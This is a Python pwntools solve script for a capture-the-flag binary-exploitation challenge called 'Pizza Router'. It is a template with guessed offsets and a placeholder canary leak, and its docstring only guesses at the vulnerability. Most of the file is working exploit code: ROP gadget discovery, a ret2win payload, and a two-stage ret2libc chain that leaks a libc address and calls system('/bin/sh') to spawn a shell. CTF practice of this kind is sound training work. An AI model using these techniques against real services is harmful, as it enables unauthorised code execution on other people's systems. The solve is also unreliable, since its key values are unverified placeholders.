#!/usr/bin/env python3
"""
Pizza Router - picoCTF 2026
Category: Binary Exploitation | Points: 400

Plan the fastest pizza drone routes and snag a slice of the flag.
The binary involves a routing/graph algorithm with a buffer overflow
or similar memory corruption vulnerability.

Usage:
    python3 solve.py                     # Run against local binary
    python3 solve.py REMOTE_HOST PORT    # Run against remote server
    python3 solve.py --recon             # Reconnaissance only (checksec, strings, symbols)

Before running:
    1. Download the binary from the challenge page
    2. Run: python3 solve.py --recon  (to see protections and symbols)
    3. Reverse engineer the binary in Ghidra/IDA
    4. Update the CONFIGURATION section below
    5. chmod +x pizza_router
"""

import sys
import re
import struct
from pwn import *

# ============================================================
# CONFIGURATION - UPDATE AFTER REVERSE ENGINEERING
# ============================================================

BINARY = "./pizza_router"
LIBC = ""  # Path to libc if needed (e.g., "./libc.so.6")
context.arch = "amd64"  # Change to "i386" if 32-bit

# Overflow parameters (find via reverse engineering)
OVERFLOW_OFFSET = 72        # Bytes of padding to reach return address (UPDATE THIS)
CANARY_OFFSET = None        # Offset to stack canary, or None if no canary
CANARY_LEAK_FMT = None      # Format string to leak canary, or None

# Win function (if it exists)
WIN_FUNC_NAME = "win"       # Try: "win", "print_flag", "get_flag", "flag"

# PIE leak configuration (if PIE enabled)
PIE_LEAK_OFFSET = None      # Stack position that leaks a code address

# ret2libc configuration (if no win function)
POP_RDI_OFFSET = None       # Offset of "pop rdi; ret" gadget from binary base
RET_OFFSET = None           # Offset of "ret" gadget (for stack alignment)
PUTS_PLT_OFFSET = None      # Offset of puts@PLT
PUTS_GOT_OFFSET = None      # Offset of puts@GOT
MAIN_OFFSET = None          # Offset of main()

# Libc offsets (if ret2libc needed -- find via libc database)
LIBC_PUTS_OFFSET = None     # Offset of puts in libc
LIBC_SYSTEM_OFFSET = None   # Offset of system in libc
LIBC_BINSH_OFFSET = None    # Offset of "/bin/sh" string in libc


# ============================================================
# HELPERS
# ============================================================

def get_connection():
    """Connect to remote or run locally."""
    if len(sys.argv) >= 3 and sys.argv[1] not in ("--recon", "--find-offset"):
        host = sys.argv[1]
        port = int(sys.argv[2])
        log.info(f"Connecting to {host}:{port}")
        return remote(host, port)
    else:
        log.info(f"Running local binary: {BINARY}")
        return process(BINARY)


def recon():
    """Perform initial reconnaissance on the binary."""
    import subprocess

    print("=" * 60)
    print("RECONNAISSANCE")
    print("=" * 60)

    # File type
    print("\n[*] File type:")
    subprocess.run(["file", BINARY])

    # Checksec
    print("\n[*] Security protections:")
    try:
        elf = ELF(BINARY)
        print(f"    Arch:     {elf.arch}")
        print(f"    RELRO:    {'Full' if elf.relro == 'Full' else 'Partial' if elf.relro else 'No'}")
        print(f"    Stack:    {'Canary found' if elf.canary else 'No canary'}")
        print(f"    NX:       {'NX enabled' if elf.nx else 'NX disabled'}")
        print(f"    PIE:      {'PIE enabled' if elf.pie else 'No PIE'}")
    except Exception as e:
        print(f"    Error: {e}")
        subprocess.run(["checksec", "--file", BINARY], capture_output=False)

    # Interesting symbols
    print("\n[*] Interesting symbols:")
    try:
        elf = ELF(BINARY, checksec=False)
        interesting = ['win', 'flag', 'print_flag', 'get_flag', 'system',
                       'execve', 'main', 'vuln', 'vulnerable', 'route',
                       'plan', 'deliver', 'pizza', 'drone']
        for sym in elf.symbols:
            sym_lower = sym.lower()
            if any(i in sym_lower for i in interesting):
                print(f"    {sym}: {hex(elf.symbols[sym])}")
    except Exception:
        pass

    # Interesting strings
    print("\n[*] Interesting strings:")
    result = subprocess.run(["strings", BINARY], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        line_lower = line.lower()
        if any(kw in line_lower for kw in ['flag', 'win', 'shell', '/bin/sh',
                                            'route', 'pizza', 'drone', 'deliver',
                                            'node', 'distance', 'path', 'menu']):
            print(f"    {line}")

    # ROP gadgets (first few)
    print("\n[*] Key ROP gadgets:")
    try:
        elf = ELF(BINARY, checksec=False)
        rop = ROP(elf)
        for gadget_name in ['rdi', 'rsi', 'rdx', 'rax', 'syscall', 'ret']:
            try:
                g = rop.find_gadget(['pop ' + gadget_name, 'ret']) if gadget_name != 'ret' else rop.find_gadget(['ret'])
                if gadget_name == 'syscall':
                    g = rop.find_gadget(['syscall'])
                if g:
                    print(f"    pop {gadget_name}; ret => {hex(g[0])}")
            except Exception:
                pass
    except Exception:
        pass

    print("\n" + "=" * 60)
    print("Next steps:")
    print("1. Open the binary in Ghidra/IDA")
    print("2. Find the vulnerable function and determine overflow offset")
    print("3. Update CONFIGURATION section in this script")
    print("4. Run: python3 solve.py [host port]")
    print("=" * 60)


def find_overflow_offset():
    """Send a cyclic pattern to find the exact overflow offset."""
    p = get_connection()

    pattern = cyclic(500)
    log.info(f"Sending cyclic pattern of length {len(pattern)}")

    # Interact with the menu to reach the vulnerable input
    # UPDATE THIS: navigate the menu to reach the overflow point
    try:
        p.recvuntil(b":", timeout=3)
        p.sendline(pattern)
    except Exception:
        p.send(pattern)

    try:
        p.wait()
    except Exception:
        pass

    # Check core dump for crash address
    # Use: dmesg | tail  or  coredumpctl info
    print("\n[*] Pattern sent. Check crash address:")
    print("    dmesg | tail -5")
    print("    Then run: cyclic_find(0xADDRESS)")

    p.close()


# ============================================================
# EXPLOIT STRATEGIES
# ============================================================

def exploit_ret2win():
    """
    Strategy 1: Simple return-to-win function.
    Works when: Binary has a win() function, no canary, no PIE (or known base).
    """
    elf = ELF(BINARY)
    p = get_connection()

    # Find win function
    win_addr = None
    for name in [WIN_FUNC_NAME, 'win', 'print_flag', 'get_flag', 'flag']:
        if name in elf.symbols:
            win_addr = elf.symbols[name]
            log.success(f"Found {name}() at {hex(win_addr)}")
            break

    if win_addr is None:
        log.error("No win function found. Try exploit_ret2libc() instead.")
        p.close()
        return

    # Build payload
    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment

    payload = b"A" * OVERFLOW_OFFSET
    payload += p64(ret_gadget)   # Align stack (needed on Ubuntu 18.04+)
    payload += p64(win_addr)

    log.info(f"Payload length: {len(payload)}")

    # Send payload through the routing interface
    # UPDATE THIS: Navigate the menu and send payload at the right point
    try:
        output = p.recvuntil(b":", timeout=3)
        log.info(f"Received: {output}")
    except Exception:
        pass

    p.sendline(payload)

    # Collect output
    try:
        result = p.recvall(timeout=5).decode(errors="ignore")
    except Exception:
        result = p.recv(timeout=3).decode(errors="ignore")

    print("\n" + "=" * 50)
    print("Output:")
    print(result)
    print("=" * 50)

    flag_match = re.search(r'picoCTF\{[^}]+\}', result)
    if flag_match:
        print(f"\nFLAG: {flag_match.group(0)}")
    else:
        print("\nFlag not found in output. Entering interactive mode...")
        try:
            p.interactive()
        except Exception:
            pass

    p.close()


def exploit_ret2win_with_canary_leak():
    """
    Strategy 2: Leak canary, then return-to-win.
    Works when: Stack canary is present but can be leaked.
    """
    elf = ELF(BINARY)

    # Phase 1: Leak canary
    log.info("Phase 1: Leaking stack canary")
    p = get_connection()

    # Common leak methods:
    # - Off-by-one overwrite of canary's null byte + read back
    # - Format string leak
    # - Separate info leak vulnerability
    # UPDATE THIS based on the specific leak method available

    # Example: off-by-one to leak canary byte-by-byte
    # This is highly binary-specific -- update accordingly
    canary = b""
    # Placeholder -- implement actual canary leak here
    log.warning("Canary leak not implemented -- update for this specific binary")
    p.close()

    if len(canary) < 8:
        log.error("Canary leak failed. Implement the specific leak method.")
        return

    # Phase 2: Overflow with canary
    log.info("Phase 2: Exploiting with leaked canary")
    p = get_connection()

    win_addr = elf.symbols.get(WIN_FUNC_NAME, None)
    if win_addr is None:
        log.error("Win function not found")
        p.close()
        return

    rop = ROP(elf)
    ret_gadget = rop.find_gadget(['ret'])[0]

    payload = b"A" * CANARY_OFFSET
    payload += canary
    payload += b"B" * 8  # Saved RBP
    payload += p64(ret_gadget)
    payload += p64(win_addr)

    # Send through routing interface (UPDATE menu navigation)
    p.sendline(payload)

    result = p.recvall(timeout=5).decode(errors="ignore")
    print(result)

    flag_match = re.search(r'picoCTF\{[^}]+\}', result)
    if flag_match:
        print(f"\nFLAG: {flag_match.group(0)}")

    p.close()


def exploit_ret2libc():
    """
    Strategy 3: ret2libc for when there is no win function.
    Works when: Can leak libc address, NX enabled, no win function.
    """
    elf = ELF(BINARY)
    p = get_connection()

    if elf.pie:
        log.error("PIE enabled -- need to leak binary base first")
        p.close()
        return

    rop = ROP(elf)

    # Gadgets
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    puts_plt = elf.plt.get('puts', elf.plt.get('printf', None))
    puts_got = elf.got.get('puts', elf.got.get('printf', None))
    main_addr = elf.symbols['main']

    if not all([puts_plt, puts_got]):
        log.error("Cannot find puts PLT/GOT. Adjust for available functions.")
        p.close()
        return

    # Phase 1: Leak libc address
    log.info("Phase 1: Leaking libc address")

    payload1 = b"A" * OVERFLOW_OFFSET
    payload1 += p64(pop_rdi)
    payload1 += p64(puts_got)
    payload1 += p64(puts_plt)
    payload1 += p64(main_addr)  # Return to main for second stage

    # Navigate menu and send payload (UPDATE THIS)
    try:
        p.recvuntil(b":", timeout=3)
    except Exception:
        pass
    p.sendline(payload1)

    # Parse leaked address
    try:
        p.recvline()  # Skip any immediate output
        leak = p.recvline().strip()
        leaked_addr = u64(leak.ljust(8, b'\x00'))
        log.success(f"Leaked puts@libc: {hex(leaked_addr)}")
    except Exception as e:
        log.error(f"Failed to parse leak: {e}")
        p.interactive()
        return

    # Calculate libc base
    if LIBC:
        libc = ELF(LIBC)
        libc.address = leaked_addr - libc.symbols['puts']
    else:
        # Try common libc offsets or use libc database
        # https://libc.blukat.me/ or https://libc.rip/
        log.warning("No libc specified. Using pwntools to find libc.")
        libc = elf.libc
        if libc:
            libc.address = leaked_addr - libc.symbols['puts']
        else:
            log.error("Cannot determine libc. Provide LIBC path.")
            p.interactive()
            return

    log.success(f"Libc base: {hex(libc.address)}")
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search(b'/bin/sh\x00'))
    log.success(f"system(): {hex(system_addr)}")
    log.success(f"/bin/sh:  {hex(binsh_addr)}")

    # Phase 2: Call system("/bin/sh")
    log.info("Phase 2: Spawning shell")

    payload2 = b"A" * OVERFLOW_OFFSET
    payload2 += p64(ret)         # Stack alignment
    payload2 += p64(pop_rdi)
    payload2 += p64(binsh_addr)
    payload2 += p64(system_addr)

    # Navigate menu again (we returned to main)
    try:
        p.recvuntil(b":", timeout=3)
    except Exception:
        pass
    p.sendline(payload2)

    log.success("Shell spawned! Use 'cat flag.txt' to get the flag.")
    p.interactive()
    p.close()


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    if "--recon" in sys.argv:
        recon()
    elif "--find-offset" in sys.argv:
        find_overflow_offset()
    elif "--ret2libc" in sys.argv:
        exploit_ret2libc()
    elif "--canary" in sys.argv:
        exploit_ret2win_with_canary_leak()
    else:
        # Default strategy: ret2win
        # Change to exploit_ret2libc() or exploit_ret2win_with_canary_leak()
        # based on your analysis of the binary
        exploit_ret2win()
